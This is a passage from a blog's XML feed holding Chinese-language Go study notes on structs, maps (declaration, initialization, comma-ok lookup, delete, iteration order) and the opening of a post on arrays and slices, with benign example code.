之间的通信：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = <span class="built_in">make</span>(<span class="keyword">chan</span> Empty) <span class="comment">// 声明一个元素类型为Empty的channel</span></span><br><span class="line">c&lt;-Empty&#123;&#125;               <span class="comment">// 向channel写入一个“事件”</span></span><br></pre></td></tr></table></figure><p>这种以空结构体为元素类建立的 channel，是目前能实现的、内存占用最小的 Goroutine 间通信方式。</p><h3 id="类型嵌入"><a href="#类型嵌入" class="headerlink" title="类型嵌入"></a>类型嵌入</h3><p>类型嵌入指的就是在一个类型的定义中嵌入了其他类型，Go 语言支持两种类型嵌入，<strong>接口类型的类型嵌入</strong>和<strong>结构体类型的类型嵌入</strong>。</p><p>这里先只介绍结构体类型的类型嵌入，后面的笔记中会详细介绍它俩。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name <span class="keyword">string</span></span><br><span class="line">    Phone <span class="keyword">string</span></span><br><span class="line">    Addr <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Book1 <span class="keyword">struct</span> &#123;</span><br><span class="line">    Title <span class="keyword">string</span></span><br><span class="line">    Author Person</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 还可以使用嵌入字段 省略字段名称</span></span><br><span class="line"><span class="keyword">type</span> Book2 <span class="keyword">struct</span> &#123;</span><br><span class="line">    Title <span class="keyword">string</span></span><br><span class="line">    Person</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问 Book 结构体字段 Author 中的 Phone 字段，下面两种方式是等价的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> book1 Book1</span><br><span class="line"><span class="keyword">var</span> book2 Book2</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正常通过结构体字段一层一层访问</span></span><br><span class="line"><span class="built_in">println</span>(book1.Author.Phone)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接访问嵌入字段所属类型中字段</span></span><br><span class="line"><span class="built_in">println</span>(book2.Phone)</span><br></pre></td></tr></table></figure><h2 id="结构体的声明与初始化"><a href="#结构体的声明与初始化" class="headerlink" title="结构体的声明与初始化"></a>结构体的声明与初始化</h2><p>和其他所有变量的声明一样，也可以使用标准变量声明语句，或者是短变量声明语句声明一个结构体类型的变量：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Book <span class="keyword">struct</span> &#123;</span><br><span class="line">     <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这三种方式都是等价的</span></span><br><span class="line"><span class="keyword">var</span> book Book</span><br><span class="line"><span class="keyword">var</span> book = Book&#123;&#125;</span><br><span class="line">book := Book&#123;&#125;       <span class="comment">// 推荐使用复合字面值的形式</span></span><br></pre></td></tr></table></figure><h3 id="零值初始化"><a href="#零值初始化" class="headerlink" title="零值初始化"></a>零值初始化</h3><p>零值初始化说的是使用结构体的零值作为它的初始值。</p><p>结构体类型的零值变量，通常不具有或者很难具有合理的意义，比如通过下面代码得到的零值 book 变量就是这样：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> book Book    <span class="comment">// book为零值结构体变量</span></span><br></pre></td></tr></table></figure><p>因为一本书既没有书名，也没有作者、页数、索引等信息，那么通过 Book 类型对这本书的抽象就失去了实际价值。所以对于像 Book 这样的结构体类型，使用零值初始化并不是正确的选择。</p><p>但是这并不是意味着零值初始化就完全没有意义了，相反，如果一种类型采用零值初始化得到的零值变量，是有意义的，而且是直接可用的。</p><p>可以说，定义零值可用类型是简化代码、改善开发者使用体验的一种重要的手段。</p><p>Go 标准库中的 <code>bytes.Buffer</code> 结构体类型，就是一个典型的例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> b bytes.Buffer            </span><br><span class="line">b.Write([]<span class="keyword">byte</span>(<span class="string">"Hello, Go"</span>))</span><br><span class="line">fmt.Println(b.String())        <span class="comment">// 输出：Hello, Go</span></span><br></pre></td></tr></table></figure><p>可以看到不需要对 <code>bytes.Buffer</code> 类型的变量 b 进行任何显式初始化，就可以直接通过处于零值状态的变量 b，调用它的方法进行写入和读取操作。</p><h3 id="复合字面值"><a href="#复合字面值" class="headerlink" title="复合字面值"></a>复合字面值</h3><p>最简单的对结构体变量进行显式初始化的方式，就是按顺序依次给每个结构体字段进行赋值：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Book <span class="keyword">struct</span> &#123;</span><br><span class="line">    Title <span class="keyword">string</span>              <span class="comment">// 书名</span></span><br><span class="line">    Pages <span class="keyword">int</span>                 <span class="comment">// 书的页数</span></span><br><span class="line">    Indexes <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>    <span class="comment">// 书的索引</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> book = Book&#123;<span class="string">"The Go Programming Language"</span>, <span class="number">700</span>, <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)&#125;</span><br><span class="line"><span class="built_in">println</span>(<span class="string">"Book Name："</span>, book.Title)       <span class="comment">// Book Name：The Go Programming Language</span></span><br><span class="line"><span class="built_in">println</span>(<span class="string">"Book Pages："</span>, book.Pages)      <span class="comment">// Book Pages：700</span></span><br></pre></td></tr></table></figure><p>这种方式虽然是最简单的，但是却不是最优的，因为存在很多问题：</p><ul><li>当结构体类型定义中的字段顺序发生变化，或者字段出现增删操作时，就需要手动调整该结构体类型变量的显式初始化代码</li><li>当一个结构体的字段较多时，这种逐一字段赋值的方式实施起来就会比较困难，增加开发者的心智负担</li><li>一旦结构体中包含非导出字段，那么这种逐一字段赋值的方式就不再被支持了，编译器会报错</li></ul><p>Go 语言推荐我们用 <strong>field:value</strong> 形式的复合字面值，对结构体类型变量进行显式初始化：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> book = Book &#123;</span><br><span class="line">  Title: <span class="string">"The Go Programming Language"</span>,</span><br><span class="line">  Pages: <span class="number">700</span>,</span><br><span class="line">  Indexes: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用这种方式，不用担心结构体字段的顺序。未显式出现在字面值中的结构体字段将采用它对应类型的零值。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>Go 语言不是一门面向对象范式的编程语言，它没有 C++ 或 Java 中的那种 class 类型</li><li>Go 语言通过结构体，提供抽象能力</li><li>结构体的定义不支持递归</li><li>结构体的初始化有几种方式：零值初始化、复合字面值初始化，依据实际场景选择使用</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100093501" target="_blank" rel="noopener">Tony Bai · Go 语言第一课</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——map</title>
      <link href="/go-language-study-notes-map/"/>
      <url>/go-language-study-notes-map/</url>
      
        <content type="html"><![CDATA[<p>作为 Go 语言复合类型之一的字典 map，使用频率也是较高的。</p><a id="more"></a><p>很多中文 Go 编程语言类技术书籍都会将它翻译为映射、哈希表或字典，在这篇笔记中约定使用 map。</p><h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><p>map 是 Go 语言提供的一种抽象数据类型，用于实现特定键值的快速查找与更新，它表示一组无序的键值对，map 中的每个 key 都是唯一的，并且有与之对应的一个 value。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221107232209.png" alt=""></p><p>和切片类似，作为复合类型的 map，它在 Go 中的类型表示也是由 key 类型与 value 类型组成的，就像下面代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">map</span>[key_type]value_type</span><br></pre></td></tr></table></figure><p>和数组一样，如果两个 map 类型的 key 元素类型相同，value 元素类型也相同，那么我们可以说它们是同一个 map 类型，否则就是不同的 map 类型。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>)</span></span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> m1 <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> m2 <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">foo(m1)    <span class="comment">// 正常编译</span></span><br><span class="line">foo(m2)    <span class="comment">// 编译失败：map[int]string 与函数foo参数的类型map[int]int 不是同一map类型</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是 map 虽然对 value 没有限制，但是对 key 的类型有严格的要求。<br>因为需要保证 key 的唯一性，key 类型就必须支持 <code>==</code> 和 <code>!=</code> 这两种比较运算符。</p><blockquote><p>那么有哪些类型不能作为 map 的 key 类型呢？</p></blockquote><p>答案是<strong>函数类型、map 类型以及切片类型</strong>。</p><p>可以来做一个实验：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s1 := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">1</span>)</span><br><span class="line">s2 := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">2</span>)</span><br><span class="line">f1 := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line">f2 := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line">m1 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>)</span><br><span class="line">m2 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>)</span><br><span class="line"><span class="built_in">println</span>(s1 == s2) <span class="comment">// 编译失败：invalid operation: s1 == s2 (slice can only be compared to nil)</span></span><br><span class="line"><span class="built_in">println</span>(f1 == f2) <span class="comment">// 编译失败：invalid operation: f1 == f2 (func can only be compared to nil)</span></span><br><span class="line"><span class="built_in">println</span>(m1 == m2) <span class="comment">// 编译失败：invalid operation: m1 == m2 (map can only be compared to nil)</span></span><br></pre></td></tr></table></figure><p>可以看到，这三种类型直接进行比较时，会编译失败。</p><h2 id="map-的声明与初始化"><a href="#map-的声明与初始化" class="headerlink" title="map 的声明与初始化"></a>map 的声明与初始化</h2><p>可以这样声明一个 map 变量：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>   <span class="comment">// 声明一个 map[string]int 类型的变量</span></span><br></pre></td></tr></table></figure><p>和切片类型变量一样，如果没有显示赋予 map 变量初始值， map 类型变量的默认值就是 <code>nil</code>。</p><p>不过不同的是，初始值为 <code>nil</code> 的切片，可以借助 append 函数对其进行操作。<br>而 map 因为自身其复杂的实现方式，无法“零值可用”。<br>所以，如果直接对处于零值的 map 进行操作，就会导致运行时异常（panic），从而导致程序进程异常退出：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span> <span class="comment">// m = nil</span></span><br><span class="line">m[<span class="string">"key"</span>] = <span class="number">1</span>         <span class="comment">// 发生运行时异常：panic: assignment to entry in nil map</span></span><br></pre></td></tr></table></figure><p>所以，在使用 map 之前，必须先对其进行初始化，初始化有两种方式，下面一一说明。</p><h3 id="复合字面值初始化"><a href="#复合字面值初始化" class="headerlink" title="复合字面值初始化"></a>复合字面值初始化</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>和前面声明 map 很像，不过有两点不同：<code>var</code> 关键字替换成了 <code>:=</code>，其次就是 value 类型后面多了一对花括号。</p><p>虽然此时 map 类型变量 m 中没有任何键值对，但变量 m 也不等同于初值为 nil 的 map 变量。</p><p>再次进行操作，就不会引发运行异常。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">m[<span class="number">99</span>] = <span class="number">99</span></span><br><span class="line"><span class="built_in">println</span>(<span class="string">"m[99] = "</span>, m[<span class="number">99</span>])  <span class="comment">// m[99] = 99</span></span><br></pre></td></tr></table></figure><p>对于稍微复杂一些的复合字面值，可以使用 Go 语言提供的“语法糖”省略部分字面值：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Position <span class="keyword">struct</span> &#123; </span><br><span class="line">    x <span class="keyword">float64</span> </span><br><span class="line">    y <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正常编译，但写法比较臃肿</span></span><br><span class="line">m1 := <span class="keyword">map</span>[Position]<span class="keyword">string</span>&#123;</span><br><span class="line">    Position&#123;<span class="number">29.935523</span>, <span class="number">52.568915</span>&#125;: <span class="string">"school"</span>,</span><br><span class="line">    Position&#123;<span class="number">25.352594</span>, <span class="number">113.304361</span>&#125;: <span class="string">"shopping-mall"</span>,</span><br><span class="line">    Position&#123;<span class="number">73.224455</span>, <span class="number">111.804306</span>&#125;: <span class="string">"hospital"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同样正常编译，通过使用语法糖直接省略 key 类型</span></span><br><span class="line">m2 := <span class="keyword">map</span>[Position]<span class="keyword">string</span>&#123;</span><br><span class="line">    &#123;<span class="number">29.935523</span>, <span class="number">52.568915</span>&#125;: <span class="string">"school"</span>,</span><br><span class="line">    &#123;<span class="number">25.352594</span>, <span class="number">113.304361</span>&#125;: <span class="string">"shopping-mall"</span>,</span><br><span class="line">    &#123;<span class="number">73.224455</span>, <span class="number">111.804306</span>&#125;: <span class="string">"hospital"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不过需要注意，对 map 进行插入操作时，不能省略否则会语法错误</span></span><br><span class="line">m2[Position&#123;<span class="number">22.935523</span>, <span class="number">34.568915</span>&#125;] = <span class="string">"store"</span>   <span class="comment">// 正常编译</span></span><br><span class="line">m2[&#123;<span class="number">22.935523</span>, <span class="number">34.568915</span>&#125;] = <span class="string">"store"</span>           <span class="comment">// 语法错误</span></span><br></pre></td></tr></table></figure><h3 id="make-函数"><a href="#make-函数" class="headerlink" title="make 函数"></a>make 函数</h3><p>和切片一样，通过 make 的初始化方式，我们可以为 map 类型变量指定键值对的初始容量，但无法进行具体的键值对赋值：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m1 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>)     <span class="comment">// 未指定初始容量</span></span><br><span class="line">m2 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>, <span class="number">8</span>)  <span class="comment">// 指定初始容量为8</span></span><br></pre></td></tr></table></figure><p>不过，map 类型的容量不会受限于它的初始容量值，当其中的键值对数量超过初始容量后，Go 运行时会自动增加 map 类型的容量，保证后续键值对的正常插入。</p><h2 id="map-基本操作"><a href="#map-基本操作" class="headerlink" title="map 基本操作"></a>map 基本操作</h2><p>因为 map 是 Go 语言中十分常用的复合数据类型，所以下面来一一了解下常用的操作有哪些。</p><h3 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a>插入操作</h3><p>面对一个非 nil 的 map 类型变量，可以插入<strong>符合 map 类型定义</strong>的任意键值对。</p><p>插入新键值对的方式很简单，我们只需要把 value 赋值给 map 中对应的 key 就可以了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>)</span><br><span class="line">m[<span class="number">1</span>] = <span class="string">"value1"</span></span><br><span class="line">m[<span class="number">2</span>] = <span class="string">"value2"</span></span><br><span class="line">m[<span class="number">3</span>] = <span class="string">"value3"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果对一个已经存在的 key 进行插入操作会覆盖原值</span></span><br><span class="line">m[<span class="number">1</span>] = <span class="string">"new value1"</span></span><br><span class="line"><span class="comment">// 此时 m 为 map[1:new value1 2:value2 3:value3]</span></span><br></pre></td></tr></table></figure><p>Go 运行时会负责 map 变量内部的内存管理，因此除非是系统内存耗尽，否则不用担心向 map 中插入新数据的数量和执行结果。</p><h3 id="获取键值对数量"><a href="#获取键值对数量" class="headerlink" title="获取键值对数量"></a>获取键值对数量</h3><p>切片可以通过 len 函数获取其长度，map 也可以通过内置函数 len，获取当前变量已经存储的键值对数量：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span> &#123;</span><br><span class="line">  <span class="string">"key1"</span> : <span class="number">1</span>,</span><br><span class="line">  <span class="string">"key2"</span> : <span class="number">2</span>,</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="built_in">len</span>(m)) <span class="comment">// 2</span></span><br><span class="line">m[<span class="string">"key3"</span>] = <span class="number">3</span>  </span><br><span class="line">fmt.Println(<span class="built_in">len</span>(m)) <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p>不过，这里要注意的是我们不能对 map 类型变量调用 cap，来获取当前容量，这是 map 类型与切片类型的一个不同点。</p><h3 id="查找和数据读取"><a href="#查找和数据读取" class="headerlink" title="查找和数据读取"></a>查找和数据读取</h3><p>和写入相比，map 类型更多用在查找和数据读取场合。<br>所谓查找，就是判断某个 key 是否存在于某个 map 中。有了前面向 map 插入键值对的基础，可能自然而然地想到，可以用下面代码去查找一个键并获得该键对应的值：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)</span><br><span class="line">v := m[<span class="string">"key1"</span>]</span><br></pre></td></tr></table></figure><p>乍一看，第二行代码在语法上好像并没有什么不当之处，但其实通过这行语句，无法确定键 key1 是否真实存在于 map 中。<br>这是因为，当尝试去获取一个键对应的值的时候，如果这个键在 map 中并不存在，也会得到一个值，这个值是 value 元素类型的零值。</p><p>以上面这个代码为例，如果键 key1 在 map 中并不存在，那么 v 的值就会被赋予 value 元素类型 int 的零值，也就是 0，所以这种方式是没有办法正确查找的。</p><p>Go 语言的 map 类型支持通过用一种名为 <strong>comma ok</strong> 的惯用法，进行对某个 key 的查询。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)</span><br><span class="line">v, ok := m[<span class="string">"key1"</span>]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">    <span class="comment">// "key1"不在map中</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// "key1"在map中，v将被赋予"key1"键对应的value</span></span><br></pre></td></tr></table></figure><p>可以看到，这里通过一个布尔类型变量 ok，来判断键“key1”是否存在于 map 中。如果存在，变量 v 就会被正确地赋值为键“key1”对应的 value。</p><p>不过，如果并不关心某个键对应的 value，而只关心某个键是否在于 map 中，可以使用空标识符 <code>_</code> 替代变量 v，忽略可能返回的 value：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)</span><br><span class="line">_, ok := m[<span class="string">"key1"</span>]</span><br></pre></td></tr></table></figure><p><code>_, ok</code> 这种用法在 Go 语言中也非常常见。</p><h3 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a>删除操作</h3><p>在 Go 语言中，需要借助内置函数 delete 来从 map 中删除数据。</p><p>使用 delete 函数的情况下，传入的第一个参数是 map 类型变量，第二个参数就是想要删除的键。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span> &#123;</span><br><span class="line">  <span class="string">"key1"</span> : <span class="number">1</span>,</span><br><span class="line">  <span class="string">"key2"</span> : <span class="number">2</span>,</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(m) <span class="comment">// map[key1:1 key2:2]</span></span><br><span class="line"><span class="built_in">delete</span>(m, <span class="string">"key2"</span>) <span class="comment">// 删除"key2"</span></span><br><span class="line">fmt.Println(m) <span class="comment">// map[key1:1]</span></span><br></pre></td></tr></table></figure><h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><p>和切片一样，使用 <code>for range</code> 语句进行遍历。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">doIteration</span><span class="params">(m <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"&#123; "</span>)</span><br><span class="line">    <span class="keyword">for</span> k, v := <span class="keyword">range</span> m &#123;</span><br><span class="line">        fmt.Printf(<span class="string">"[%d, %d] "</span>, k, v)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">"&#125;\n"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    m := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;</span><br><span class="line">        <span class="number">1</span>: <span class="number">11</span>,</span><br><span class="line">        <span class="number">2</span>: <span class="number">12</span>,</span><br><span class="line">        <span class="number">3</span>: <span class="number">13</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">        doIteration(m)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每次迭代都会返回一个键值对，其中键存在于变量 k 中，它对应的值存储在变量 v 中。</p><p>运行上面的示例代码，可能会得到这样的结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; [3, 13] [1, 11] [2, 12] &#125;</span><br><span class="line">&#123; [1, 11] [2, 12] [3, 13] &#125;</span><br><span class="line">&#123; [3, 13] [1, 11] [2, 12] &#125;</span><br></pre></td></tr></table></figure><p>这是因为，<strong>对同一 map 做多次遍历的时候，每次遍历元素的次序都不相同。</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>map 作为复合类型之一，也是引用类型，没有传递开销</li><li>Go 不允许获取 map 中 value 的地址，这个约束是在编译期间就生效的</li><li>对同一个 map 多次遍历时，每次元素次序不尽相同，所以不要依赖 map 的元素遍历顺序</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100093501" target="_blank" rel="noopener">Tony Bai · Go 语言第一课</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——数组和切片</title>
      <link href="/go-language-study-notes-array-and-slice/"/>
      <url>/go-language-study-notes-array-and-slice/</url>
      
        <content type="html"><![CDATA[<p>Go 语言原生内置了多种复合数据类型，包括数组、切片（slice）、map、结构体，以及像 channel 这类用于并发程序设计的高级复合数据类型。</p><a id="more"></a><blockquote><p>什么是复合类型？</p></blockquote><p>复合类型就是由<strong>多个同构类型（相同类型）或异构类型（不同类型）的元素的值组成而成的</strong>。</p><p>这篇笔记先来认识一下最简单的复合类型——数组以及和数组有密切关系的切片。</p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>数组的定义：是一个<strong>长度固定</strong>、<strong>由同构类型元素</strong>组成的连续序列。</p><p>声明一个数组：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr [N]T</span><br></pre></td></tr></table></figure><p>Go 语言的数组有两个重要的属性：<strong>元素的类型</strong>和<strong>数组的长度（元素的个数）</strong>。</p><p>在上面的示例代码中，它的类型为<code>[N]T</code>，其中元素的类型为 <code>T</code>，数组的长度为 <code>N</code>。注意，这里用的是 <code>[N]T</code> 描述它的类型，并不是打错字了，而是为了后面做铺垫。</p><p><strong>如果两个数组类型的元素类型 T 与数组长度 N 都是一样的，那么这两个数组类型是等价的，如果有一个属性不同，它们就是两个不同的数组类型。</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 